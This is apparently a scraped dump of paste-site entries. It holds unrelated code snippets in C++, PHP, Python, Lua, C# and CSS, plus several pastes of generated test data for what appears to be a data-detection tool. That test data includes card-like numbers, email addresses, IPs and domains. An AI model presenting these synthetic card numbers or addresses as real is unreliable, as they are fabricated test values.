    file.write(reinterpret_cast<char*>(&header.colorMapDepth), sizeof(char));
    file.write(reinterpret_cast<char*>(&header.xOrigin), sizeof(short));
    file.write(reinterpret_cast<char*>(&header.yOrigin), sizeof(short));
    file.write(reinterpret_cast<char*>(&header.width), sizeof(short));
    file.write(reinterpret_cast<char*>(&header.height), sizeof(short));
    file.write(reinterpret_cast<char*>(&header.bitsPerPixel), sizeof(char));
    file.write(reinterpret_cast<char*>(&header.imageDescriptor), sizeof(char));
}

File::Pixel** File::readPixelArray(std::ifstream& file, int width, int height) {
    // create 2D array of pixels
    Pixel** pixelArray = new Pixel*[width];

    // read pixels row as many pixels of w/h
    for (int i = 0; i < width; ++i) {
      pixelArray[i] = new Pixel[height];
      file.read(reinterpret_cast<char*>(pixelArray[i]), sizeof(Pixel) * height);
    }

    return pixelArray;
}


void File::writePixelArray(Pixel** pixelArray, std::ofstream& file) {
    for (int i = 0; i < header.height; ++i) {
        file.write(reinterpret_cast<char*>(pixelArray[i]), sizeof(Pixel) * header.width);
    }
}

File::Header File::getHeader() {
    return header;
}"
Jh99cVaa,sendmail_eposter_employee_registration.php,rivg26,PHP,Thursday 13th of July 2023 12:45:43 PM CDT,"<?php

// email libraries/credentials
require_once ""{$root}vendor/autoload.php"";
use Mailgun\Mailgun;

// load email template object
require_once ""{$root}classes/EmailTemplate.php"";
require_once ""{$root}classes/PrimarySender.php"";
use PrimarySender\PrimarySender;
use EmailTemplate\EmailTemplate;
$email_template = new EmailTemplate($db, $root);

// get email template 'applied-to' id and type
if($company_id != 0){
	$et_xid = $company_id;
	$et_xtype = 'companies';
} else {
	$et_xid = ""{$affiliate_id}"";
	$et_xtype = 'affiliates';
}

// get employer name
if($company_id != 0){
	$employer_name = $company_name;
} else {
	if($affiliate == 'Renge'){
		$employer_name = 'Renge Learning';
	} else {
		$employer_name = $affiliate . ' (affiliate)';
	}
}

// get employer admin email and name
$collection = $db->UserAccount;

$pm_sender = new PrimarySender($db);
$employee_primary_sender = $pm_sender->getEmployeePrimarySender($company_id, $affiliate_id);
$employer_admin_email = $employee_primary_sender['employer_admin_email'];
$employer_admin_name = $employee_primary_sender['employer_admin_name'];

// assemble tags data
$tags_data = [
				'first_name' => ucwords(strtolower($fname)),
				'last_name' => ucwords(strtolower($lname)),
				'employer_name' => $employer_name,
				'username' => $username,
				'temp_password' => $temp_password,
				'employer_admin_email' => $employer_admin_email,
				'employer_admin_name' => $employer_admin_name
];

// generate email subject and body
$res = $email_template->generate_email_message('eposter_employee_registration', $et_xid, $et_xtype, $tags_data);
									
// send email via mailgun API
if($res['status'] == 'ok'){

	// get mailgun credentials
	if($company_id != 0){
		$mailgun_credentials = $email_template->getEmployerMailgun($company_id);
	} else {
		$mailgun_credentials = $email_template->getAffiliateMailgun($affiliate_id);
	}

	$email_subject = $res['email_subject'];
	$email_body = $res['email_body'];
	$mg = new Mailgun($mailgun_credentials['api_key']);
	$messageBldr = $mg->MessageBuilder();
	$messageBldr->setFromAddress($mailgun_credentials['emailer']);
	$messageBldr->addToRecipient($email);
	$messageBldr->setSubject($email_subject);
	$messageBldr->setHtmlBody($email_body);
	$mg->post(""{$mailgun_credentials['domain']}/messages"", $messageBldr->getMessage());
}
?>"
mnFZFTWn,Untitled,onilink_,C++,Thursday 13th of July 2023 12:43:26 PM CDT,"void downscale(ImageBuffer& im_src)
{
    ImageBuffer im_dst;
    im_dst.wid = im_src.wid / 2;
    im_dst.hei = im_src.hei / 2;
    im_dst.buffer.resize(uint64_t(im_dst.wid) * im_dst.hei * 4);
    
    const unsigned W = im_src.wid * 4;
    
    #pragma omp parallel for
    for(unsigned y=0; y<im_dst.hei; y++) {
        for(unsigned x=0; x<im_dst.wid; x++) {
            unsigned src_x = x * 2;
            unsigned src_y = y * 2;
            unsigned src_idx = (src_x + src_y * im_src.wid) * 4;
            unsigned dst_idx = (x + y*im_dst.wid) * 4;
            
            for(unsigned n=0; n<4; ++n)
            {
                im_dst.buffer[dst_idx+n] = (0u + 
                        uint8_t(im_src.buffer[src_idx+n]) +
                        uint8_t(im_src.buffer[src_idx+n+4]) +
                        uint8_t(im_src.buffer[src_idx+n+W]) +
                        uint8_t(im_src.buffer[src_idx+n+W+4]))/4;
            }
        }
    }
    
    std::swap(im_src, im_dst);
}"
SdZvaLWb,Untitled,wclovers,CSS,Thursday 13th of July 2023 12:27:43 PM CDT,"@media screen and (max-width: 480px) {
    #wcfm_store_header .header_right {
        display: flex !important;
        flex-direction: column !important;
    }

    #wcfm_store_header .header_right .bd_icon_area.lft {
        display: flex !important;
        flex-direction: row !important;
        justify-content: center !important;
        position: initial !important;
    }
}"
r0XRbitd,Untitled,bgabrovsek,Python,Thursday 13th of July 2023 12:21:16 PM CDT,"

def ROTATE_TRAJECTORIES(data, angle_x, angle_y, angle_z):
    """"""
    Rotates the data in 3D by rotating for angles degrees around x, y and z axis.
    Args:
        data: input list of sequences of xzy trajectory, shape (n, m, 3)
        angles_x, angles_y, angles_z: list of angles for each coordinates
    Returns: new data

    """"""
    from scipy.spatial.transform import Rotation as R

    print(""Rotating data by"", angle_x, ""around x"", angle_y, ""around y"", angle_z, ""around z"")

    num_traj = data.shape[0]
    data = data.reshape((-1,3))  # put all trajectories as one long trajectories
    rot = R.from_euler('xyz', [angle_x, angle_y, angle_z], degrees=True)
    new_data = rot.apply(data).reshape((num_traj,-1,3))  # rotate and split trajectories
    data.reshape(num_traj,-1,3)
    return new_data


...
##### FITTING THE MODEL #####
angles = [0, 30, 45, 60]
full_epochs = 1  # number of times all rotations are processed (repeated)
batch_size = 32
epoch_counter = 0
all_epochs = full_epochs * (len(angles) ** 3)

for fepoch in range(full_epochs):
    for rot_vec in product(angles, repeat=3):
        print(f""*** Epoch {epoch_counter + 1} of {all_epochs} ***"")
        data_train_rotated = ROTATE_TRAJECTORIES(data_train_x, *rot_vec)
        print(""Training data with shapes"", data_train_rotated.shape, ""and"", data_train_y.shape)

        # split (sub)batches
        num_batches = len(data_train_rotated) // batch_size
        for batch in range(num_batches):

            start_idx = batch * batch_size
            end_idx = start_idx + batch_size

            x_batch = data_train_rotated[start_idx:end_idx]
            y_batch = data_train_y[start_idx:end_idx]

            if STACK_3TO9:
                x_batch = theta3to9(x_batch)
                #print(""converting 3 to 9"")

            loss, accuracy = model.train_on_batch(x_batch, y_batch)

            if batch % 100 == 0:
                print()
                test_loss, test_accuracy = model.evaluate(data_test_x, data_test_y)
                #print(""Test Loss:"", test_loss)
                #print(""Test Accuracy:"", test_accuracy)

                print(
                    f""Epoch: {epoch_counter + 1}/{all_epochs}, Batch: {batch + 1}/{num_batches},""
                    f"" Loss: {loss:.4f}, Accuracy: {accuracy:.4f},""
                    f""Test Loss: {test_loss:.4f}, Accuracy: {test_accuracy:.4f}"")
"
83CAgM1Y,Botania Flower Crafting,jBlume,Lua,Thursday 13th of July 2023 12:06:10 PM CDT,"--Slot 1: empty Bucket (2x2. water source under)
--Slot 2-?: craft items split in to drop one of each
--Final Slot: Seeds (to complete the flower)

while true do

--refill Petal appothecary
 turtle.select(1)
 turtle. placeDown()
 turtle. place()

--cycle drop for recipe
 s=2
 for i=1,5 do
  turtle.select(s)
  turtle.drop(1)
  s=s+1
 end

--pick up flower creation
 turtle.suck()
end"
Hb9jxXzH,Server,capitan007,C#,Thursday 13th of July 2023 12:04:13 PM CDT,"using Akka.Actor;
using Akka.Configuration;
using Akka.IO;

class Program
{
    static void Main(string[] args)
    {
        // Загрузка конфигурации Akka.NET
        var config = ConfigurationFactory.ParseString(@""
            akka {
                actor {
                    provider = """"Akka.Remote.RemoteActorRefProvider, Akka.Remote""""
                }
                remote {
                    dot-netty.tcp {
                        port = 8081
                        hostname = localhost
                    }
                }
            }
        "");

        // Создание акторной системы
        var system = ActorSystem.Create(""ChatSystem"", config);

        // Создание актора сервера
        var serverActor = system.ActorOf<ServerActor>(""ServerActor"");

        // Ожидание нажатия клавиши для завершения работы сервера
        Console.WriteLine(""Нажмите любую клавишу для выхода..."");
        Console.ReadKey();

        // Остановка акторной системы
        system.Terminate().Wait();
    }
}

public class ServerActor : ReceiveActor
{
    private IActorRef chatRoom;

    public ServerActor()
    {
        chatRoom = Context.ActorOf<ChatRoomActor>(""ChatRoomActor"");

        Receive<string>(message =>
        {
            // Пересылка сообщения в чат-комнату
            chatRoom.Tell(message);
        });
    }
}

public class ChatRoomActor : ReceiveActor
{
    public ChatRoomActor()
    {
        Receive<string>(message =>
        {
            // Вывод сообщения в консоль
            Console.WriteLine(""Сообщение: "" + message);

            // Отправка сообщения всем клиентам
            Context.ActorSelection(""/user/ClientActor*"").Tell(message);
        });
    }
}
"
vEthjKww,dan-masek Adding support for len in pybind11 enum -- version 2,dan-masek,Python,Thursday 13th of July 2023 11:43:07 AM CDT,"#include <pybind11/pybind11.h>

namespace py = pybind11;

enum class Kind { Kind1 = 1, Kind2, Kind3 };


py::object get_pybind11_metaclass()
{
    auto &internals = py::detail::get_internals();
    return py::reinterpret_borrow<py::object>((PyObject*)internals.default_metaclass);
}

py::object get_standard_metaclass()
{
    auto &internals = py::detail::get_internals();
    return py::reinterpret_borrow<py::object>((PyObject *)&PyType_Type);
}

py::object create_enum_metaclass()
{
    auto pybind11_metaclass = get_pybind11_metaclass();
    auto standard_metaclass = get_standard_metaclass();

    py::dict attributes;
    attributes[""__len__""] = py::cpp_function(
        [](py::object cls) {
            return py::len(cls.attr(""__entries""));
        }
        , py::is_method(py::none())
        );
    return standard_metaclass(std::string(""pybind11_ext_enum"")
        , py::make_tuple(pybind11_metaclass)
        , attributes);
}

PYBIND11_MODULE(so07, m)
{
    auto enum_metaclass = create_enum_metaclass();
    py::enum_<Kind>(m, ""Kind"", py::metaclass(enum_metaclass))
        .value(""Kind1"", Kind::Kind1)
        .value(""Kind2"", Kind::Kind2)
        .value(""Kind3"", Kind::Kind3)
        ;
}
"
rsRSQFy4,GetCompleteChatSessionsAsync,YupItsTopher,C#,Thursday 13th of July 2023 11:35:59 AM CDT,"/// <inheritdoc/>
public async Task<PagedResult<ChatSession>> GetCompleteChatSessionsAsync(int currentPage, int pageSize, int userID, string companyName, string startDate, string endDate)
{
    using var context = new PermittingReadContext();
    var chatSessions = new List<ChatSession>();

    chatSessions = (await context.Query(""LIVECHATSESSION as lcs"")
                                 .Select(""lcs.{ LVCS_ID, LVCS_STATUS, PROS_USER_ID, USER_NAME, PROS_SUPPORT_USER_ID, LVCS_SCREENNAME, LVCS_STARTTIMESTAMP, LVCS_ENDTIMESTAMP, LVCS_REQUESTED_SUPPORT_USER_ID, LVCS_SUPPORT_USER_SCREENNAME, LVCS_GROUP_ID }"",
                                         ""c.CUST_NM as CUSTOMER_COMPANY_NAME"")
                                 .Join(""PROS_USER as susr"", ""lcs.PROS_SUPPORT_USER_ID"", ""susr.PROS_USER_ID"")
                                 .Join(""PROS_USER as cusr"", ""lcs.PROS_USER_ID"", ""cusr.PROS_USER_ID"")
                                 .LeftJoin(""CUST as c"", ""cusr.CUST_ID"", ""c.CUST_ID"")
                                 .When(!string.IsNullOrWhiteSpace(companyName) && userID <= 0, q => q.Where(""c.CUST_NM"", ""like"", companyName), 
                                    q => q.When(!string.IsNullOrWhiteSpace(companyName) && userID > 0, q => q.Where(""lcs.PROS_SUPPORT_USER_ID"", userID).Where(""c.CUST_NM"", ""like"", companyName), 
                                    q => q.When(userID > 0, q => q.Where(""lcs.PROS_SUPPORT_USER_ID"", userID))))
                                 .Where(q => q.Where(""lcs.LVCS_STATUS"", ""0"").OrWhere(""lcs.LVCS_STATUS"", ""U""))
                                 .WhereBetween(""LVCS_ENDTIMESTAMP"", startDate, endDate)
                                 .OrderByDesc(""lcs.LVCS_ENDTIMESTAMP"")
                                 .GetAsync<ChatSession>())
                                 .ToList();

    var paginatedList = chatSessions.Paginate(currentPage, pageSize).ToList();
    var unpaginatedList = chatSessions.ToList();

    return new PagedResult<ChatSession>
    {
        Results = paginatedList,
        PageCount = unpaginatedList.Count > 0 ? unpaginatedList.Count.GetPageCount(pageSize) : 0
    };
}"
5GZ8rc2L,№21. RPG: Улучшения,Chl_Snt,Python,Thursday 13th of July 2023 11:29:16 AM CDT,"import random
import time


class Player:
    def __init__(self, name, hp, damage):
        self.name = name
        self.hp = hp
        self.damage = damage
        self.xp = 0
        self.lvl = 1
        self.heals = 2

    def attack(self, victim):
        victim.hp -= self.damage
        print(f""Ты нанёс врагу {self.damage} ⚔️. Теперь у него {victim.hp} ❤️."")
        if victim.hp <= 0:
            print(f""{victim.name} повержен!"")
            self.xp += victim.xp
            print(f""Ты получил {victim.xp} опыта! Теперь у тебя {self.lvl} LVL и {self.xp} XP."")
            if self.xp >= 100:
                self.lvl += 1
                print(f""ПОЗДРАВЛЯЮ! Уровень повышен: {self.lvl}"")
                self.xp = 0
                self.damage *= 1.5
                print(f""Ты стал сильнее! ⚔️: {self.damage}"")

            luck = random.randint(0, 1)
            if luck == 1:
                self.heals += 1
                print(f""Ты получил Лечебный отвар🧋! Теперь у тебя их {self.heals} ед."")
            return False
        else:
            return True


class Enemy:
    races = {
        ""Слизняк"": (10, 10),
        ""Волк"": (25, 20),
        ""Орк"": (50, 45),
        ""Группа гоблинов"": (120, 25),
        ""Оборотень"": (150, 50)
    }

    def __init__(self):
        self.name = random.choice(list(self.races.keys()))
        self.hp = self.races[self.name][0]
        self.damage = self.races[self.name][1]
        self.xp = self.hp * 1.5

    def attack(self, victim):
        victim.hp -= self.damage
        print(f""{self.name} нанёс тебе {self.damage} ⚔️. Теперь у тебя {victim.hp} ❤️."")
        if victim.hp <= 0:
            exit(print(""ПОТРАЧЕНО!""))
        else:
            return True


def create_hero(name, race, prof):
    hp = 100
    dmg = 25
    hp *= races[race][0]
    hp *= profs[prof][0]
    dmg *= races[race][1]
    dmg *= profs[prof][1]
    hero = Player(name, hp, dmg)
    return hero


def start(heal=None):
    if heal is None:
        enemy = Enemy()
    else:
        enemy = heal
    print(f""Тебе встретился {enemy.name}. ❤️: {enemy.hp}, ⚔️: {enemy.damage}"")
    print(""Нападать?"")
    answer = input(""Да/Нет/Лечиться: "").lower()
    if answer == ""да"":
        fight(enemy)
    elif answer == ""лечиться"":
        if hero.heals > 0:
            hero.hp += 50
            hero.heals -= 1
            print(f""Ты выпил Лечебный отвар🧋. ❤️: {hero.hp}"")
        else:
            print(""У тебя нет больше отвара."")
        start(enemy)
    else:
        luck = random.randint(1, 100)
        if luck in range(40):
            print(""Ты смог незаметно ускользнуть и пойти дальше!"")
            time.sleep(2)
            start()
        else:
            print(""Ты НЕ смог незаметно ускользнуть!"")
            time.sleep(2)
            enemy.attack(hero)
            fight(enemy)


def fight(victim):
    result = hero.attack(victim)
    time.sleep(1)
    if result:
        victim.attack(hero)
        time.sleep(1)
        fight(victim)
    else:
        start()


name = input(""Введи своё имя: "")

races = {
    ""эльф"": (1.5, 1),
    ""гном"": (0.8, 1.2),
    ""человек"": (1, 1)
}

profs = {
    ""лучник"": (0.9, 2),
    ""щитоносец"": (2, 0.6),
    ""рыцарь"": (1.2, 1.2)
}

race = """"
prof = """"
while race not in tuple(races.keys()):
    print(f""Выбери расу: {tuple(races.keys())}"")
    race = input(""-> "").lower()

while prof not in tuple(profs.keys()):
    print(f""Выбери профессию: {tuple(profs.keys())}"")
    prof = input(""-> "").lower()

hero = create_hero(name, race, prof)
print(f""Здравствуй, герой с именем {hero.name}!\n""
      f""Твоё здоровье равно {hero.hp} ХП.\n""
      f""Твой урон равен {hero.damage} единицам.\n""
      f""Желаю удачи в приключениях, странник! ^_+"")
time.sleep(1)
start()
"
RmnpfcnG,Adding support for len in pybind11 enum -- version 1,dan-masek,Python,Thursday 13th of July 2023 11:25:19 AM CDT,"#include <pybind11/pybind11.h>

namespace py = pybind11;

enum class Kind { Kind1 = 1, Kind2, Kind3 };


py::object get_pybind11_metaclass()
{
    auto &internals = py::detail::get_internals();
    return py::reinterpret_borrow<py::object>((PyObject*)internals.default_metaclass);
}

py::object get_standard_metaclass()
{
    auto &internals = py::detail::get_internals();
    return py::reinterpret_borrow<py::object>((PyObject *)&PyType_Type);
}

py::object create_enum_metaclass()
{
    auto pybind11_metaclass = get_pybind11_metaclass();
    auto standard_metaclass = get_standard_metaclass();

    py::dict attributes;
    attributes[""__len__""] = py::cpp_function(
        [](py::object cls) {
            return cls.attr(""_member_count"")();
        }
        , py::is_method(py::none())
        );
    return standard_metaclass(std::string(""pybind11_ext_enum"")
        , py::make_tuple(pybind11_metaclass)
        , attributes);
}

PYBIND11_MODULE(so07, m)
{
    auto enum_metaclass = create_enum_metaclass();
    py::enum_<Kind>(m, ""Kind"", py::metaclass(enum_metaclass))
        .value(""Kind1"", Kind::Kind1)
        .value(""Kind2"", Kind::Kind2)
        .value(""Kind3"", Kind::Kind3)
        .def_static(""_member_count"", []() {
            return 3;
        });
}
"
vRrmPb62,Advanced AND - Donald AND Duck AND Hello,wheresTheAnyKey,C,Thursday 13th of July 2023 11:18:00 AM CDT,"Pasted at: 13/07/2023 17:18
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND
hello, donald was a duck

5502491997132108

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
ZKVfG4Ch,Financial What's Inside - Email/IP/Bank,wheresTheAnyKey,C,Thursday 13th of July 2023 11:17:59 AM CDT,"Pasted at: 13/07/2023 17:17
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3
What's Inside Paste 

5378496492418234
5571598708435236
5587663820997281
5502491997132108
5516931903918995
5322909948799236
5443317136071703
5409137465238695
5497550044220575
5559606180091553

aaribaud@att.net
aaribaud@comcast.net
aaribaud@att.com
aaribaud@att.co.uk
aaribaud@yahoo.com

246.107.72.199
221.187.199.189
3.109.3.44
109.112.85.139
250.83.213.179
169.141.201.234
50.180.50.59
20.181.54.231
64.235.191.167
48.103.36.43"
uwsPkWXN,Financial with SPECIAL CHARACTERS,wheresTheAnyKey,C,Thursday 13th of July 2023 11:17:57 AM CDT,"Pasted at: 13/07/2023 17:17
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

5148-2121-6312-7114   - DASHES
5148212163127114
5107-4578-0576-9075   - DASHES
5107457805769075
3488-1760-1454-729   - DASHES
348817601454729

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
TLf4Egpz,Domains with SPECIAL CHARS,wheresTheAnyKey,C,Thursday 13th of July 2023 11:17:55 AM CDT,"Pasted at: 13/07/2023 17:17
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

www.qatesting.com
blog.qatesting.com
www.qatesting.com/index.html
www.qatesting.com/home
www.qatestingblog.com
www.qatestingtutorials.com
shop.qatesting.co.uk
admin.qatesting.io 
qatesting
qatesting.co.uk
qatesting.cn
qatesting.io
findmetesting.com
www.qatesting-blog.com
www.qatesting-blog23.com
www.qatesting
www.qatesting.co.uk
www.qatesting.cn
www.qatesting.io
www.findmetesting.com
www.wobsut.gov

The difference is that QA is process oriented and QC is product oriented.

Testing, therefore is product oriented and thus is in the QC domain. Testing for quality isn't assuring quality, it's controlling it.



Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
19dHxysA,ALL Keywords with Excluded Words,wheresTheAnyKey,C,Thursday 13th of July 2023 11:17:53 AM CDT,"Pasted at: 13/07/2023 17:17
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND 

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, 
or more recently Ex Machina, and even the Avengers. The “furious deity A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, 
it surpasses our abilities in every way, and it destroys us for one of any number of reasons.Maybe it perceives us as a threat. Maybe we’re just in its way, 
and it hardly perceives us at all — mankind, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. 
I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than 
it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with 
no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly 
unknowable coming from?"
PgGr9dEJ,All Keywords with ANY Additional Words,wheresTheAnyKey,C,Thursday 13th of July 2023 11:17:52 AM CDT,"Pasted at: 13/07/2023 17:17
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND KEYWAUTO

The dystopian version of superintelligence is illustrated with frequency by leaders in the technology industry, and is famously depicted by Hollywood in films like Terminator, or more recently Ex Machina, and even the Avengers. The “angry god A.I.” is a story you know, because it is the story you are constantly told: we build the thinking machine, it surpasses our abilities in every way, and it destroys us for one of any number of reasons.
Maybe it perceives us as a threat. Maybe we’re just in its way, and it hardly perceives us at all — humanity, a disposable insect race.

There are of course many arguments in opposition to the now ubiquitous concept of our apocalypse by artificial intelligence. I myself have called into question the logic of such dystopian arguments in Anatomy of Next. But our subject here is less pertaining to the nature of the conscious machine than it is to the way we talk about this subject, and what it means. First, consider that most of the artificial intelligence depicted in culture looks human, a representation with no basis in technological reality. Then, the true scope of the Singularity is almost impossible to predict, which begs a question: where are these opinions about the broadly unknowable coming from?

6589745854123698

Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH
"
Mg6Lg32b,IP with SPECIAL CHARACTERS,wheresTheAnyKey,C,Thursday 13th of July 2023 11:17:49 AM CDT,"Pasted at: 13/07/2023 17:17
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

DATA_ID_TESTDATATOFIND

123.123.123.149
123.123.123.7
123.123.123.186
123.123.123.47
123.123.123.187
123.123.123.47
123.123.123.130
123.123.123.62
123.123.123.87
123.123.123.1
123.123.123.61
123.123.123.1
123.123.123.65
123.123.123.65
123.123.123.189
123.123.123.193
123.123.123.78
123.123.123.142
123.123.123.107
123.123.123.126
123.123.123.13
123.123.123.171
123.123.123.45
123.123.123.61
123.123.123.93
123.123.123.2
123.123.123.71
123.123.123.41
123.123.123.184
123.123.123.74
123.123.123.106
123.123.123.171
123.123.123.188
123.123.123.177
123.123.123.185
123.123.123.9
123.123.123.184
123.123.123.100
123.123.123.31
123.123.123.164
123.123.123.184
123.123.123.12
123.123.123.153
123.123.123.72
123.123.123.44
123.123.123.119
123.123.123.119
123.123.123.163
123.123.123.38
123.123.123.67
123.123.123.59
123.123.123.10
123.123.123.50
123.123.123.121
123.123.123.145
123.123.123.159
123.123.123.64
123.123.123.6
123.123.123.39
123.123.123.198
123.123.123.17
123.123.123.65
123.123.123.149
123.123.123.84
123.123.123.8
123.123.123.145
123.123.123.65
123.123.123.94
123.123.123.79
123.123.123.177
123.123.123.67
123.123.123.78
123.123.123.80
123.123.123.79
123.123.123.50
123.123.123.87
123.123.123.15
123.123.123.80
123.123.123.145
123.123.123.75
123.123.123.4
123.123.123.59
123.123.123.59
123.123.123.190
123.123.123.64
123.123.123.63
123.123.123.102
123.123.123.114
123.123.123.146
123.123.123.53
123.123.123.124
123.123.123.30
123.123.123.57
123.123.123.64
123.123.123.69
123.123.123.33
123.123.123.12
123.123.123.73
123.123.123.36
123.123.123.153
100.123.123.50
100.123.123.39
100.123.123.156
100.123.123.56
100.123.123.175
100.123.123.121
100.123.123.114
100.123.123.118
100.123.123.13
100.123.123.174
100.123.123.84
100.123.123.161
100.123.123.63
100.123.123.51
100.123.123.66
100.123.123.190
100.123.123.101
100.123.123.72
100.123.123.24
100.123.123.151
100.123.123.143
100.123.123.146
100.123.123.117
100.123.123.21
100.123.123.10
100.123.123.98
100.123.123.114
100.123.123.6
100.123.123.101
100.123.123.14
100.123.123.147
100.123.123.159
100.123.123.157
100.123.123.6
100.123.123.175
100.123.123.35
100.123.123.136
100.123.123.2
100.123.123.139
100.123.123.11
100.123.123.179
100.123.123.16
100.123.123.40
100.123.123.20
100.123.123.20
100.123.123.150
100.123.123.77
100.123.123.48
100.123.123.22
100.123.123.24
100.123.123.9
100.123.123.187
100.123.123.131
100.123.123.148
100.123.123.152
100.123.123.96
100.123.123.199
100.123.123.15
100.123.123.4
100.123.123.112
100.123.123.62
100.123.123.186
100.123.123.36
100.123.123.136
100.123.123.83
100.123.123.38
100.123.123.120
100.123.123.147
100.123.123.15
100.123.123.134
100.123.123.19
100.123.123.196
100.123.123.115
100.123.123.126
100.123.123.39
100.123.123.193
100.123.123.117
100.123.123.115
100.123.123.115
100.123.123.33
100.123.123.121
100.123.123.72
100.123.123.189
100.123.123.76
100.123.123.78
100.123.123.61
100.123.123.112
100.123.123.176
100.123.123.82
100.123.123.183
100.123.123.168
100.123.123.24
100.123.123.134
100.123.123.145
100.123.123.195
100.123.123.189
100.123.123.157
100.123.123.114
100.123.123.34
100.123.123.166

These are a list of generated IPs for test purPoses. They seRVe no purpose only to act as test data for testing activities.
You might findMEtesting 123.123.123.123 or findmetesting 100.123.123.76. These are my favourite ip addresses 123.123.123.23 100.123.123.23.
These are some random words networking, ipaddresses, studpidIPs


Fuzzy-Wuzzy	- DASH
Fuzzy;Wuzzy	- COLON
Fuzzy!Wuzzy	- EXCLAMATION
Fuzzy£Wuzzy	- POUND
Fuzzy#Wuzzy	- HASH
Fuzzy%Wuzzy	- PERCENT
Fuzzy@Wuzzy	- AT
Fuzzy&Wuzzy	- AND
Fuzzy=Wuzzy	- EQUAL
Fuzzy§Wuzzy
Fuzzy~Wuzzy
Fuzzy?Wuzzy	 - QUESTION MARK
Fuzzy$Wuzzy	 - DOLLAR
Fuzzy[Wuzzy] - BRACKETS
Fuzzy^Wuzzy
Fuzzy(Wuzzy) - BRACKETS
Fuzzy+Wuzzy	 - PLUS
Fuzzy±Wuzzy	 - PLUS/MINUE
Fuzzy|Wuzzy	 - PIPE
Fuzzy/Wuzzy	 - FORWARDSLASH
Fuzzy<Wuzzy> - BRACKETS
Fuzzy{Wuzzy} - CURLY
Fuzzy\Wuzzy  - BACKSLASH"
anZXCUyy,Hashed Email With Exclude,wheresTheAnyKey,C,Thursday 13th of July 2023 11:17:47 AM CDT,"Pasted at: 13/07/2023 17:17
Test data generated by 98823c9ce7f73d22c0e84a43ab6f6ed3

